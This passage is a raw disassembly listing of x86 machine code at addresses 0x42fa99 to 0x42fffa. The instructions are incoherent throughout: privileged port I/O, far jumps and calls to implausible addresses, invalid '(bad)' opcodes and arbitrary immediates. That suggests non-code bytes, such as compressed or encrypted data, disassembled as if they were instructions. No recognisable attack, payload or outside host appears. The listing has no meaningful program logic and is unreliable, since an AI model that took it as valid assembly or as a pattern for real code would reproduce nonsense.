  42fa99:	22 3d 93 d3 b1 b5    	and    0xb5b1d393,%bh
  42fa9f:	cb                   	lret
  42faa0:	ef                   	out    %eax,(%dx)
  42faa1:	7f 18                	jg     0x42fabb
  42faa3:	00 b3 df 6a fd 7e    	add    %dh,0x7efd6adf(%ebx)
  42faa9:	ed                   	in     (%dx),%eax
  42faaa:	ef                   	out    %eax,(%dx)
  42faab:	07                   	pop    %es
  42faac:	9d                   	popf
  42faad:	d3 14 2b             	rcll   %cl,(%ebx,%ebp,1)
  42fab0:	8a d0                	mov    %al,%dl
  42fab2:	b2 2b                	mov    $0x2b,%dl
  42fab4:	01 3f                	add    %edi,(%edi)
  42fab6:	aa                   	stos   %al,%es:(%edi)
  42fab7:	81 93 a9 eb d8 61 cc 	adcl   $0xc41dcfcc,0x61d8eba9(%ebx)
  42fabe:	cf 1d c4 
  42fac1:	6a 45                	push   $0x45
  42fac3:	83 5d 01 eb          	sbbl   $0xffffffeb,0x1(%ebp)
  42fac7:	60                   	pusha
  42fac8:	ac                   	lods   %ds:(%esi),%al
  42fac9:	40                   	inc    %eax
  42faca:	63 f2                	arpl   %esi,%edx
  42facc:	7e 87                	jle    0x42fa55
  42face:	95                   	xchg   %eax,%ebp
  42facf:	d8 7b f7             	fdivrs -0x9(%ebx)
  42fad2:	1a 54 09 c4          	sbb    -0x3c(%ecx,%ecx,1),%dl
  42fad6:	20 fe                	and    %bh,%dh
  42fad8:	b0 15                	mov    $0x15,%al
  42fada:	60                   	pusha
  42fadb:	d1 62 dd             	shll   $1,-0x23(%edx)
  42fade:	ae                   	scas   %es:(%edi),%al
  42fadf:	a0 79 21 97 5d       	mov    0x5d972179,%al
  42fae4:	b9 c2 34 a4 4c       	mov    $0x4ca434c2,%ecx
  42fae9:	af                   	scas   %es:(%edi),%eax
  42faea:	9b                   	fwait
  42faeb:	8c dc                	mov    %ds,%esp
  42faed:	a2 a2 e1 dd ab       	mov    %al,0xabdde1a2
  42faf2:	f6 fe                	idiv   %dh
  42faf4:	2d b6 b9 79 27       	sub    $0x2779b9b6,%eax
  42faf9:	60                   	pusha
  42fafa:	c0 63 5a fb          	shlb   $0xfb,0x5a(%ebx)
  42fafe:	99                   	cltd
  42faff:	b3 a4                	mov    $0xa4,%bl
  42fb01:	5f                   	pop    %edi
  42fb02:	81 13 11 74 f6 ec    	adcl   $0xecf67411,(%ebx)
  42fb08:	d8 82 52 c2 56 85    	fadds  -0x7aa93dae(%edx)
  42fb0e:	1c b6                	sbb    $0xb6,%al
  42fb10:	fb                   	sti
  42fb11:	96                   	xchg   %eax,%esi
  42fb12:	13 00                	adc    (%eax),%eax
  42fb14:	d8 5d 0b             	fcomps 0xb(%ebp)
  42fb17:	d2 02                	rolb   %cl,(%edx)
  42fb19:	53                   	push   %ebx
  42fb1a:	fb                   	sti
  42fb1b:	96                   	xchg   %eax,%esi
  42fb1c:	8b 56 90             	mov    -0x70(%esi),%edx
  42fb1f:	0e                   	push   %cs
  42fb20:	6e                   	outsb  %ds:(%esi),(%dx)
  42fb21:	26 09 d0             	es or  %edx,%eax
  42fb24:	2d c8 28 f5 a2       	sub    $0xa2f528c8,%eax
  42fb29:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fb2a:	05 dc e5 b1 99       	add    $0x99b1e5dc,%eax
  42fb2f:	0d e0 45 5b 52       	or     $0x525b45e0,%eax
  42fb34:	de 2a                	fisubrs (%edx)
  42fb36:	61                   	popa
  42fb37:	54                   	push   %esp
  42fb38:	33 ba 32 4d 70 d6    	xor    -0x298fb2ce(%edx),%edi
  42fb3e:	45                   	inc    %ebp
  42fb3f:	fb                   	sti
  42fb40:	31 50 8c             	xor    %edx,-0x74(%eax)
  42fb43:	9c                   	pushf
  42fb44:	12 a1 d6 aa f9 fe    	adc    -0x106552a(%ecx),%ah
  42fb4a:	e1 a1                	loope  0x42faed
  42fb4c:	aa                   	stos   %al,%es:(%edi)
  42fb4d:	fb                   	sti
  42fb4e:	7b 83                	jnp    0x42fad3
  42fb50:	52                   	push   %edx
  42fb51:	d5 3e                	aad    $0x3e
  42fb53:	b4 70                	mov    $0x70,%ah
  42fb55:	74 84                	je     0x42fadb
  42fb57:	fd                   	std
  42fb58:	54                   	push   %esp
  42fb59:	b9 fa 30 29 a5       	mov    $0xa52930fa,%ecx
  42fb5e:	e2 6c                	loop   0x42fbcc
  42fb60:	b8 7e 34 4a 49       	mov    $0x494a347e,%eax
  42fb65:	72 ee                	jb     0x42fb55
  42fb67:	a1 13 aa 2c af       	mov    0xaf2caa13,%eax
  42fb6c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fb6d:	dd 4a 7c             	fisttpll 0x7c(%edx)
  42fb70:	1e                   	push   %ds
  42fb71:	18 80 06 49 cd 5d    	sbb    %al,0x5dcd4906(%eax)
  42fb77:	c3                   	ret
  42fb78:	5e                   	pop    %esi
  42fb79:	a2 ce 7b 6a bf       	mov    %al,0xbf6a7bce
  42fb7e:	09 27                	or     %esp,(%edi)
  42fb80:	56                   	push   %esi
  42fb81:	88 c5                	mov    %al,%ch
  42fb83:	4d                   	dec    %ebp
  42fb84:	c4                   	(bad)
  42fb85:	ee                   	out    %al,(%dx)
  42fb86:	0c b2                	or     $0xb2,%al
  42fb88:	e7 f6                	out    %eax,$0xf6
  42fb8a:	0c f7                	or     $0xf7,%al
  42fb8c:	4d                   	dec    %ebp
  42fb8d:	f6 d3                	not    %bl
  42fb8f:	05 f7 89 12 07       	add    $0x71289f7,%eax
  42fb94:	d4 d1                	aam    $0xd1
  42fb96:	ea 6d 5e 4a fa ad 66 	ljmp   $0x66ad,$0xfa4a5e6d
  42fb9d:	3f                   	aas
  42fb9e:	ec                   	in     (%dx),%al
  42fb9f:	02 2b                	add    (%ebx),%ch
  42fba1:	22 90 67 62 04 58    	and    0x58046267(%eax),%dl
  42fba7:	b0 73                	mov    $0x73,%al
  42fba9:	85 44 7d db          	test   %eax,-0x25(%ebp,%edi,2)
  42fbad:	b0 0b                	mov    $0xb,%al
  42fbaf:	81 68 a2 00 07 b0 ec 	subl   $0xecb00700,-0x5e(%eax)
  42fbb6:	95                   	xchg   %eax,%ebp
  42fbb7:	60                   	pusha
  42fbb8:	c8 ca 53 e0          	enter  $0x53ca,$0xe0
  42fbbc:	bb 10 bd 22 d7       	mov    $0xd722bd10,%ebx
  42fbc1:	d5 0a                	aad    $0xa
  42fbc3:	ba 0e b2 1a a7       	mov    $0xa71ab20e,%edx
  42fbc8:	1a 42 d3             	sbb    -0x2d(%edx),%al
  42fbcb:	02 e6                	add    %dh,%ah
  42fbcd:	35 b1 36 b8 17       	xor    $0x17b836b1,%eax
  42fbd2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42fbd3:	d6                   	salc
  42fbd4:	7d f1                	jge    0x42fbc7
  42fbd6:	f3 3d c5 ad ec fb    	repz cmp $0xfbecadc5,%eax
  42fbdc:	6d                   	insl   (%dx),%es:(%edi)
  42fbdd:	5b                   	pop    %ebx
  42fbde:	3d b9 7a 31 86       	cmp    $0x86317ab9,%eax
  42fbe3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42fbe4:	c1 14 bc 98          	rcll   $0x98,(%esp,%edi,4)
  42fbe8:	69 cd 7c c1 0f 9a    	imul   $0x9a0fc17c,%ebp,%ecx
  42fbee:	83 2e 0f             	subl   $0xf,(%esi)
  42fbf1:	e1 24                	loope  0x42fc17
  42fbf3:	48                   	dec    %eax
  42fbf4:	63 e6                	arpl   %esp,%esi
  42fbf6:	aa                   	stos   %al,%es:(%edi)
  42fbf7:	49                   	dec    %ecx
  42fbf8:	f7 c3 fc 87 f8 f3    	test   $0xf3f887fc,%ebx
  42fbfe:	69 dd e9 cb 0f 5a    	imul   $0x5a0fcbe9,%ebp,%ebx
  42fc04:	51                   	push   %ecx
  42fc05:	eb 2b                	jmp    0x42fc32
  42fc07:	06                   	push   %es
  42fc08:	ab                   	stos   %eax,%es:(%edi)
  42fc09:	b0 d8                	mov    $0xd8,%al
  42fc0b:	7e 3e                	jle    0x42fc4b
  42fc0d:	dc bb 55 34 5a 22    	fdivrl 0x225a3455(%ebx)
  42fc13:	ea 34 bd 36 aa 0e 86 	ljmp   $0x860e,$0xaa36bd34
  42fc1a:	22 29                	and    (%ecx),%ch
  42fc1c:	1e                   	push   %ds
  42fc1d:	be ec 60 81 a4       	mov    $0xa48160ec,%esi
  42fc22:	1c 59                	sbb    $0x59,%al
  42fc24:	eb 78                	jmp    0x42fc9e
  42fc26:	98                   	cwtl
  42fc27:	7b 41                	jnp    0x42fc6a
  42fc29:	02 1a                	add    (%edx),%bl
  42fc2b:	ad                   	lods   %ds:(%esi),%eax
  42fc2c:	0d 07 72 3e 6f       	or     $0x6f3e7207,%eax
  42fc31:	0f f0                	(bad)
  42fc33:	81 25 ee 31 1f b1 63 	andl   $0xc42d7463,0xb11f31ee
  42fc3a:	74 2d c4 
  42fc3d:	86 06                	xchg   %al,(%esi)
  42fc3f:	18 d5                	sbb    %dl,%ch
  42fc41:	4c                   	dec    %esp
  42fc42:	2f                   	das
  42fc43:	d4 f8                	aam    $0xf8
  42fc45:	4f                   	dec    %edi
  42fc46:	a0 f7 66 f0 71       	mov    0x71f066f7,%al
  42fc4b:	bf 8e 44 cc 51       	mov    $0x51cc448e,%edi
  42fc50:	3e 0f 61 08          	punpcklwd %ds:(%eax),%mm1
  42fc54:	21 d2                	and    %edx,%edx
  42fc56:	85 a3 e9 cb 8e 32    	test   %esp,0x328ecbe9(%ebx)
  42fc5c:	95                   	xchg   %eax,%ebp
  42fc5d:	b4 26                	mov    $0x26,%ah
  42fc5f:	cd ce                	int    $0xce
  42fc61:	56                   	push   %esi
  42fc62:	24 10                	and    $0x10,%al
  42fc64:	ee                   	out    %al,(%dx)
  42fc65:	94                   	xchg   %eax,%esp
  42fc66:	97                   	xchg   %eax,%edi
  42fc67:	a1 b3 56 82 1e       	mov    0x1e8256b3,%eax
  42fc6c:	2d 49 f5 f5 24       	sub    $0x24f5f549,%eax
  42fc71:	87 5c 77 57          	xchg   %ebx,0x57(%edi,%esi,2)
  42fc75:	6c                   	insb   (%dx),%es:(%edi)
  42fc76:	35 d0 c2 86 4a       	xor    $0x4a86c2d0,%eax
  42fc7b:	df e9                	fucomip %st(1),%st
  42fc7d:	92                   	xchg   %eax,%edx
  42fc7e:	0e                   	push   %cs
  42fc7f:	2a cf                	sub    %bh,%cl
  42fc81:	0a 10                	or     (%eax),%dl
  42fc83:	94                   	xchg   %eax,%esp
  42fc84:	ac                   	lods   %ds:(%esi),%al
  42fc85:	22 a2 04 c3 0f f3    	and    -0xcf03cfc(%edx),%ah
  42fc8b:	11 a4 88 df 0a c0 26 	adc    %esp,0x26c00adf(%eax,%ecx,4)
  42fc92:	0a b3 0b fe 16 c9    	or     -0x36e901f5(%ebx),%dh
  42fc98:	28 14 f4             	sub    %dl,(%esp,%esi,8)
  42fc9b:	04 76                	add    $0x76,%al
  42fc9d:	4c                   	dec    %esp
  42fc9e:	e8 55 4e 71 c4       	call   0xc4b44af8
  42fca3:	01 86 7f 6b 02 0a    	add    %eax,0xa026b7f(%esi)
  42fca9:	ed                   	in     (%dx),%eax
  42fcaa:	cf                   	iret
  42fcab:	5b                   	pop    %ebx
  42fcac:	c4 0a                	les    (%edx),%ecx
  42fcae:	5d                   	pop    %ebp
  42fcaf:	b4 b0                	mov    $0xb0,%ah
  42fcb1:	77 a8                	ja     0x42fc5b
  42fcb3:	60                   	pusha
  42fcb4:	77 78                	ja     0x42fd2e
  42fcb6:	2a b5 2d ee 63 3e    	sub    0x3e63ee2d(%ebp),%dh
  42fcbc:	0d 1b c8 b4 8a       	or     $0x8ab4c81b,%eax
  42fcc1:	c3                   	ret
  42fcc2:	99                   	cltd
  42fcc3:	b0 28                	mov    $0x28,%al
  42fcc5:	f1                   	int1
  42fcc6:	16                   	push   %ss
  42fcc7:	34 e7                	xor    $0xe7,%al
  42fcc9:	c6                   	(bad)
  42fcca:	f0 1f                	lock pop %ds
  42fccc:	34 47                	xor    $0x47,%al
  42fcce:	20 8c 84 c5 12 cc e5 	and    %cl,-0x1a33ed3b(%esp,%eax,4)
  42fcd5:	f6 fe                	idiv   %dh
  42fcd7:	51                   	push   %ecx
  42fcd8:	67 b3 39             	addr16 mov $0x39,%bl
  42fcdb:	4b                   	dec    %ebx
  42fcdc:	37                   	aaa
  42fcdd:	aa                   	stos   %al,%es:(%edi)
  42fcde:	f9                   	stc
  42fcdf:	fd                   	std
  42fce0:	c1 3b 63             	sarl   $0x63,(%ebx)
  42fce3:	5a                   	pop    %edx
  42fce4:	31 7a cb             	xor    %edi,-0x35(%edx)
  42fce7:	b0 a6                	mov    $0xa6,%al
  42fce9:	e2 c7                	loop   0x42fcb2
  42fceb:	40                   	inc    %eax
  42fcec:	0d db 94 72 60       	or     $0x607294db,%eax
  42fcf1:	15 83 00 84 40       	adc    $0x40840083,%eax
  42fcf6:	97                   	xchg   %eax,%edi
  42fcf7:	ce                   	into
  42fcf8:	72 e3                	jb     0x42fcdd
  42fcfa:	09 1d ad 63 9f be    	or     %ebx,0xbe9f63ad
  42fd00:	c0 1e e1             	rcrb   $0xe1,(%esi)
  42fd03:	10 68 02             	adc    %ch,0x2(%eax)
  42fd06:	25 d0 be 98 2c       	and    $0x2c98bed0,%eax
  42fd0b:	ad                   	lods   %ds:(%esi),%eax
  42fd0c:	d3 d1                	rcl    %cl,%ecx
  42fd0e:	e3 9e                	jecxz  0x42fcae
  42fd10:	ab                   	stos   %eax,%es:(%edi)
  42fd11:	56                   	push   %esi
  42fd12:	bc 05 00 14 78       	mov    $0x78140005,%esp
  42fd17:	d2 b7 aa 1c 39 f7    	shlb   %cl,-0x8c6e356(%edi)
  42fd1d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fd1e:	c2 22 83             	ret    $0x8322
  42fd21:	fe 88 d9 86 18 b9    	decb   -0x46e77927(%eax)
  42fd27:	33 81 94 50 b9 86    	xor    -0x7946af6c(%ecx),%eax
  42fd2d:	fd                   	std
  42fd2e:	2b 37                	sub    (%edi),%esi
  42fd30:	98                   	cwtl
  42fd31:	89 d1                	mov    %edx,%ecx
  42fd33:	ff 74 a2 89          	push   -0x77(%edx,%eiz,4)
  42fd37:	8a 08                	mov    (%eax),%cl
  42fd39:	20 09                	and    %cl,(%ecx)
  42fd3b:	26 62 78 54          	bound  %edi,%es:0x54(%eax)
  42fd3f:	72 fd                	jb     0x42fd3e
  42fd41:	aa                   	stos   %al,%es:(%edi)
  42fd42:	0b e0                	or     %eax,%esp
  42fd44:	1d ac 56 b1 a7       	sbb    $0xa7b156ac,%eax
  42fd49:	bf 43 bf 91 40       	mov    $0x4091bf43,%edi
  42fd4e:	22 82 45 d9 62 0f    	and    0xf62d945(%edx),%al
  42fd54:	f1                   	int1
  42fd55:	8d 25 fb 9c 86 ce    	lea    0xce869cfb,%esp
  42fd5b:	48                   	dec    %eax
  42fd5c:	9c                   	pushf
  42fd5d:	5d                   	pop    %ebp
  42fd5e:	f0 98                	lock cwtl
  42fd60:	11 13                	adc    %edx,(%ebx)
  42fd62:	cf                   	iret
  42fd63:	f8                   	clc
  42fd64:	7a bc                	jp     0x42fd22
  42fd66:	6e                   	outsb  %ds:(%esi),(%dx)
  42fd67:	df 48 02             	fisttps 0x2(%eax)
  42fd6a:	d9 7f 77             	fnstcw 0x77(%edi)
  42fd6d:	00 c7                	add    %al,%bh
  42fd6f:	5e                   	pop    %esi
  42fd70:	75 28                	jne    0x42fd9a
  42fd72:	0d 8e 40 b6 4a       	or     $0x4ab6408e,%eax
  42fd77:	09 a9 36 e3 bc a6    	or     %ebp,-0x59431cca(%ecx)
  42fd7d:	22 c3                	and    %bl,%al
  42fd7f:	34 05                	xor    $0x5,%al
  42fd81:	20 ac 18 40 24 73 f2 	and    %ch,-0xd8cdbc0(%eax,%ebx,1)
  42fd88:	fb                   	sti
  42fd89:	6b 57 d0 c1          	imul   $0xffffffc1,-0x30(%edi),%edx
  42fd8d:	3f                   	aas
  42fd8e:	aa                   	stos   %al,%es:(%edi)
  42fd8f:	08 cc                	or     %cl,%ah
  42fd91:	f0 2f                	lock das
  42fd93:	60                   	pusha
  42fd94:	cd 22                	int    $0x22
  42fd96:	42                   	inc    %edx
  42fd97:	61                   	popa
  42fd98:	2c 4d                	sub    $0x4d,%al
  42fd9a:	cf                   	iret
  42fd9b:	1e                   	push   %ds
  42fd9c:	07                   	pop    %es
  42fd9d:	bd 20 cc 30 15       	mov    $0x1530cc20,%ebp
  42fda2:	b4 58                	mov    $0x58,%ah
  42fda4:	89 c8                	mov    %ecx,%eax
  42fda6:	30 b8 a4 da 18 28    	xor    %bh,0x2818daa4(%eax)
  42fdac:	ff                   	ljmp   (bad)
  42fdad:	eb eb                	jmp    0x42fd9a
  42fdaf:	57                   	push   %edi
  42fdb0:	e1 e1                	loope  0x42fd93
  42fdb2:	3a 6f 3d             	cmp    0x3d(%edi),%ch
  42fdb5:	14 b5                	adc    $0xb5,%al
  42fdb7:	03 ea                	add    %edx,%ebp
  42fdb9:	99                   	cltd
  42fdba:	56                   	push   %esi
  42fdbb:	f7 7c ae a6          	idivl  -0x5a(%esi,%ebp,4)
  42fdbf:	b4 58                	mov    $0x58,%ah
  42fdc1:	1a ec                	sbb    %ah,%ch
  42fdc3:	3d 01 60 06 f4       	cmp    $0xf4066001,%eax
  42fdc8:	aa                   	stos   %al,%es:(%edi)
  42fdc9:	ae                   	scas   %es:(%edi),%al
  42fdca:	77 ed                	ja     0x42fdb9
  42fdcc:	55                   	push   %ebp
  42fdcd:	bd 38 1c 81 88       	mov    $0x88811c38,%ebp
  42fdd2:	63 ef                	arpl   %ebp,%edi
  42fdd4:	a0 6a 10 b2 10       	mov    0x10b2106a,%al
  42fdd9:	7b 02                	jnp    0x42fddd
  42fddb:	1f                   	pop    %ds
  42fddc:	84 69 8e             	test   %ch,-0x72(%ecx)
  42fddf:	ac                   	lods   %ds:(%esi),%al
  42fde0:	75 a7                	jne    0x42fd89
  42fde2:	0d f3 82 26 f8       	or     $0xf82682f3,%eax
  42fde7:	7a 57                	jp     0x42fe40
  42fde9:	d9 cd                	fxch   %st(5)
  42fdeb:	f6 b1 d0 54 d8 78    	divb   0x78d854d0(%ecx)
  42fdf1:	e0 1b                	loopne 0x42fe0e
  42fdf3:	a8 86                	test   $0x86,%al
  42fdf5:	d3 57 9a             	rcll   %cl,-0x66(%edi)
  42fdf8:	cf                   	iret
  42fdf9:	95                   	xchg   %eax,%ebp
  42fdfa:	6c                   	insb   (%dx),%es:(%edi)
  42fdfb:	64 5e                	fs pop %esi
  42fdfd:	08 50 1e             	or     %dl,0x1e(%eax)
  42fe00:	97                   	xchg   %eax,%edi
  42fe01:	cd e2                	int    $0xe2
  42fe03:	7c 06                	jl     0x42fe0b
  42fe05:	dd c3                	ffree  %st(3)
  42fe07:	02 da                	add    %dl,%bl
  42fe09:	b4 20                	mov    $0x20,%ah
  42fe0b:	8e 8a af 7f 11 6d    	mov    0x6d117faf(%edx),%cs
  42fe11:	35 ee ad 78 2a       	xor    $0x2a78adee,%eax
  42fe16:	7e 39                	jle    0x42fe51
  42fe18:	bc 05 4e 28 a2       	mov    $0xa2284e05,%esp
  42fe1d:	03 6a 55             	add    0x55(%edx),%ebp
  42fe20:	87 9b 9f 35 e7 38    	xchg   %ebx,0x38e7359f(%ebx)
  42fe26:	56                   	push   %esi
  42fe27:	ce                   	into
  42fe28:	7a 44                	jp     0x42fe6e
  42fe2a:	63 56 ff             	arpl   %edx,-0x1(%esi)
  42fe2d:	c9                   	leave
  42fe2e:	06                   	push   %es
  42fe2f:	ac                   	lods   %ds:(%esi),%al
  42fe30:	d7                   	xlat   %ds:(%ebx)
  42fe31:	1f                   	pop    %ds
  42fe32:	14 4b                	adc    $0x4b,%al
  42fe34:	3e 8c 2c b1          	mov    %gs,%ds:(%ecx,%esi,4)
  42fe38:	ff e1                	jmp    *%ecx
  42fe3a:	54                   	push   %esp
  42fe3b:	f3 33 5d 38          	repz xor 0x38(%ebp),%ebx
  42fe3f:	04 00                	add    $0x0,%al
  42fe41:	d1 c2                	rol    $1,%edx
  42fe43:	49                   	dec    %ecx
  42fe44:	b1 87                	mov    $0x87,%cl
  42fe46:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42fe47:	10 05 e0 e6 3a 24    	adc    %al,0x243ae6e0
  42fe4d:	69 97 ca d4 c1 cc ca 	imul   $0x1122d1ca,-0x333e2b36(%edi),%edx
  42fe54:	d1 22 11 
  42fe57:	e3 aa                	jecxz  0x42fe03
  42fe59:	48                   	dec    %eax
  42fe5a:	df 7d 42             	fistpll 0x42(%ebp)
  42fe5d:	5f                   	pop    %edi
  42fe5e:	19 1f                	sbb    %ebx,(%edi)
  42fe60:	1d 7d 5d 54 c8       	sbb    $0xc8545d7d,%eax
  42fe65:	96                   	xchg   %eax,%esi
  42fe66:	34 c5                	xor    $0xc5,%al
  42fe68:	52                   	push   %edx
  42fe69:	89 5b 80             	mov    %ebx,-0x80(%ebx)
  42fe6c:	af                   	scas   %es:(%edi),%eax
  42fe6d:	68 28 72 c0 f8       	push   $0xf8c07228
  42fe72:	47                   	inc    %edi
  42fe73:	07                   	pop    %es
  42fe74:	11 5a fe             	adc    %ebx,-0x2(%edx)
  42fe77:	50                   	push   %eax
  42fe78:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42fe79:	75 3e                	jne    0x42feb9
  42fe7b:	a8 9f                	test   $0x9f,%al
  42fe7d:	b6 3a                	mov    $0x3a,%dh
  42fe7f:	63 53 bf             	arpl   %edx,-0x41(%ebx)
  42fe82:	b7 58                	mov    $0x58,%bh
  42fe84:	da c5                	fcmovb %st(5),%st
  42fe86:	28 22                	sub    %ah,(%edx)
  42fe88:	2e 17                	cs pop %ss
  42fe8a:	a8 e3                	test   $0xe3,%al
  42fe8c:	cd 4e                	int    $0x4e
  42fe8e:	70 31                	jo     0x42fec1
  42fe90:	7b 68                	jnp    0x42fefa
  42fe92:	9d                   	popf
  42fe93:	d4 0d                	aam    $0xd
  42fe95:	cc                   	int3
  42fe96:	e8 19 06 c9 cb       	call   0xcc0c04b4
  42fe9b:	04 f9                	add    $0xf9,%al
  42fe9d:	e3 48                	jecxz  0x42fee7
  42fe9f:	04 08                	add    $0x8,%al
  42fea1:	75 fe                	jne    0x42fea1
  42fea3:	04 7f                	add    $0x7f,%al
  42fea5:	35 f5 22 27 33       	xor    $0x332722f5,%eax
  42feaa:	8d 53 d7             	lea    -0x29(%ebx),%edx
  42fead:	8f 06                	pop    (%esi)
  42feaf:	0b 16                	or     (%esi),%edx
  42feb1:	70 31                	jo     0x42fee4
  42feb3:	22 fe                	and    %dh,%bh
  42feb5:	14 83                	adc    $0x83,%al
  42feb7:	44                   	inc    %esp
  42feb8:	06                   	push   %es
  42feb9:	9f                   	lahf
  42feba:	13 09                	adc    (%ecx),%ecx
  42febc:	03 49 75             	add    0x75(%ecx),%ecx
  42febf:	a9 a5 b0 0d 0e       	test   $0xe0db0a5,%eax
  42fec4:	e7 64                	out    %eax,$0x64
  42fec6:	57                   	push   %edi
  42fec7:	9d                   	popf
  42fec8:	15 d5 2e 96 bc       	adc    $0xbc962ed5,%eax
  42fecd:	9d                   	popf
  42fece:	be de e6 ec a3       	mov    $0xa3ece6de,%esi
  42fed3:	1f                   	pop    %ds
  42fed4:	55                   	push   %ebp
  42fed5:	5d                   	pop    %ebp
  42fed6:	37                   	aaa
  42fed7:	67 35 00 45 4b ac    	addr16 xor $0xac4b4500,%eax
  42fedd:	c3                   	ret
  42fede:	50                   	push   %eax
  42fedf:	c8 51 bd 9f          	enter  $0xbd51,$0x9f
  42fee3:	aa                   	stos   %al,%es:(%edi)
  42fee4:	7d 37                	jge    0x42ff1d
  42fee6:	01 1b                	add    %ebx,(%ebx)
  42fee8:	84 2b                	test   %ch,(%ebx)
  42feea:	fc                   	cld
  42feeb:	b9 1f 76 9f 0c       	mov    $0xc9f761f,%ecx
  42fef0:	37                   	aaa
  42fef1:	18 9e 65 f2 a3 96    	sbb    %bl,-0x695c0d9b(%esi)
  42fef7:	42                   	inc    %edx
  42fef8:	e8 60 21 0f c4       	call   0xc452205d
  42fefd:	7c 11                	jl     0x42ff10
  42feff:	d2 6f 8e             	shrb   %cl,-0x72(%edi)
  42ff02:	66 2c 1c             	data16 sub $0x1c,%al
  42ff05:	7d 3f                	jge    0x42ff46
  42ff07:	6e                   	outsb  %ds:(%esi),(%dx)
  42ff08:	11 b5 da 5c 50 6c    	adc    %esi,0x6c505cda(%ebp)
  42ff0e:	ca 06 75             	lret   $0x7506
  42ff11:	04 8a                	add    $0x8a,%al
  42ff13:	ff 34 93             	push   (%ebx,%edx,4)
  42ff16:	39 55 52             	cmp    %edx,0x52(%ebp)
  42ff19:	89 2d 82 25 55 2a    	mov    %ebp,0x2a552582
  42ff1f:	66 e8 74 c4          	callw  0xc397
  42ff23:	6a df                	push   $0xffffffdf
  42ff25:	e7 0f                	out    %eax,$0xf
  42ff27:	1f                   	pop    %ds
  42ff28:	bb 97 03 ae 9d       	mov    $0x9dae0397,%ebx
  42ff2d:	b0 36                	mov    $0x36,%al
  42ff2f:	07                   	pop    %es
  42ff30:	4f                   	dec    %edi
  42ff31:	a8 7d                	test   $0x7d,%al
  42ff33:	34 a4                	xor    $0xa4,%al
  42ff35:	c9                   	leave
  42ff36:	cd 1d                	int    $0x1d
  42ff38:	c2 7e fb             	ret    $0xfb7e
  42ff3b:	53                   	push   %ebx
  42ff3c:	f0 e8 9d a0 85 44    	lock call 0x44c89fdf
  42ff42:	01 dd                	add    %ebx,%ebp
  42ff44:	8b 8f b9 8a 8a d0    	mov    -0x2f757547(%edi),%ecx
  42ff4a:	5c                   	pop    %esp
  42ff4b:	ac                   	lods   %ds:(%esi),%al
  42ff4c:	13 3a                	adc    (%edx),%edi
  42ff4e:	89 f4                	mov    %esi,%esp
  42ff50:	44                   	inc    %esp
  42ff51:	c4 57 e7             	les    -0x19(%edi),%edx
  42ff54:	9e                   	sahf
  42ff55:	71 17                	jno    0x42ff6e
  42ff57:	ff 1f                	lcall  *(%edi)
  42ff59:	05 70 05 4b 3d       	add    $0x3d4b0570,%eax
  42ff5e:	ed                   	in     (%dx),%eax
  42ff5f:	01 92 73 0d 0e f9    	add    %edx,-0x6f1f28d(%edx)
  42ff65:	47                   	inc    %edi
  42ff66:	62 ee 92             	(bad) {rz-bad},{%k2}
  42ff69:	72 c0                	jb     0x42ff2b
  42ff6b:	a3 3e da 70 0f       	mov    %eax,0xf70da3e
  42ff70:	ba da ca 2b 26       	mov    $0x262bcada,%edx
  42ff75:	03 f2                	add    %edx,%esi
  42ff77:	f1                   	int1
  42ff78:	f8                   	clc
  42ff79:	90                   	nop
  42ff7a:	0b a7 86 36 9c d3    	or     -0x2c63c97a(%edi),%esp
  42ff80:	2c 45                	sub    $0x45,%al
  42ff82:	82 20 dc             	andb   $0xdc,(%eax)
  42ff85:	85 dc                	test   %ebx,%esp
  42ff87:	8b dc                	mov    %esp,%ebx
  42ff89:	b7 87                	mov    $0x87,%bh
  42ff8b:	8d 16                	lea    (%esi),%edx
  42ff8d:	de eb                	fsubrp %st,%st(3)
  42ff8f:	f5                   	cmc
  42ff90:	e3 9a                	jecxz  0x42ff2c
  42ff92:	09 79 e4             	or     %edi,-0x1c(%ecx)
  42ff95:	ee                   	out    %al,(%dx)
  42ff96:	17                   	pop    %ss
  42ff97:	10 65 45             	adc    %ah,0x45(%ebp)
  42ff9a:	28 66 ee             	sub    %ah,-0x12(%esi)
  42ff9d:	44                   	inc    %esp
  42ff9e:	c5 70 5c             	lds    0x5c(%eax),%esi
  42ffa1:	2e 01 dd             	cs add %ebx,%ebp
  42ffa4:	38 3d ec fa e0 0f    	cmp    %bh,0xfe0faec
  42ffaa:	16                   	push   %ss
  42ffab:	4f                   	dec    %edi
  42ffac:	48                   	dec    %eax
  42ffad:	be b5 f9 34 b2       	mov    $0xb234f9b5,%esi
  42ffb2:	20 c2                	and    %al,%dl
  42ffb4:	fe                   	(bad)
  42ffb5:	bc 73 d7 99 35       	mov    $0x3599d773,%esp
  42ffba:	02 d7                	add    %bh,%dl
  42ffbc:	6f                   	outsl  %ds:(%esi),(%dx)
  42ffbd:	e3 a1                	jecxz  0x42ff60
  42ffbf:	06                   	push   %es
  42ffc0:	55                   	push   %ebp
  42ffc1:	52                   	push   %edx
  42ffc2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42ffc3:	55                   	push   %ebp
  42ffc4:	68 b7 52 63 38       	push   $0x386352b7
  42ffc9:	1a 0a                	sbb    (%edx),%cl
  42ffcb:	c7 47 97 54 c6 0a cb 	movl   $0xcb0ac654,-0x69(%edi)
  42ffd2:	ba c5 56 04 ab       	mov    $0xab0456c5,%edx
  42ffd7:	6d                   	insl   (%dx),%es:(%edi)
  42ffd8:	e4 42                	in     $0x42,%al
  42ffda:	e3 8d                	jecxz  0x42ff69
  42ffdc:	0a a5 37 f9 ea 4e    	or     0x4eeaf937(%ebp),%ah
  42ffe2:	9c                   	pushf
  42ffe3:	00 d8                	add    %bl,%al
  42ffe5:	41                   	inc    %ecx
  42ffe6:	c7                   	(bad)
  42ffe7:	7f 45                	jg     0x43002e
  42ffe9:	de 1e                	ficomps (%esi)
  42ffeb:	62 91 29 25 92 05    	bound  %edx,0x5922529(%ecx)
  42fff1:	1c ee                	sbb    $0xee,%al
  42fff3:	5e                   	pop    %esi
  42fff4:	c8 29 fb d4          	enter  $0xfb29,$0xd4
  42fff8:	c5 2a                	lds    (%edx),%ebp
  42fffa:	7c cf                	jl     0x42ffcb
